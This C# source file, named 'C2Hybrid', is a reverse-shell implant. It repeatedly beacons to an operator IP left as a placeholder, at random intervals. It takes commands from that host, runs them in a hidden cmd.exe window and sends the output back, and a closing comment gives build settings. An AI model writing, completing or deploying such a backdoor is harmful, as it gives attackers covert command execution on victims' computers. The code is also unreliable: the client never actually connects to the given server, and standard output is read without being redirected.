using System;
using System.Net.Sockets;
using System.Threading;

namespace C2Hybrid
{
    public class Shell
    {
        static void Main(string[] args)
        {
            while(true)
                {
                var seconds = GetRandomSec();
                Connect("replace with your ip");
                Thread.Sleep(seconds);
            }
        }

    
        public static string Exec(string cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c" + cmd;
            startInfo.UseShellExecute = false;
            process.StartInfo = startInfo;
            process.StartInfo.RedirectStandardError = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;

        }
        public static void Connect(string server)
        {
            TcpClient tcpClient = new TcpClient();
            NetworkStream stream = tcpClient.GetStream();
            var data = new byte[256];
            String cmd = String.Empty;
            Int32 bytes = stream.Read(data, 0, data.Length);
            cmd = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
            Console.WriteLine(cmd);

            var cmdOut = Exec(cmd);

            byte[] msg = System.Text.Encoding.ASCII.GetBytes(cmdOut);
            stream.Write(msg,0,msg.Length);
            stream.Close();
            tcpClient.Close();
        }
        public static int GetRandomSec()
        {
            Random random = new Random();
            return random.Next(10000);
        }
    }
}

//build with Release & x64 processor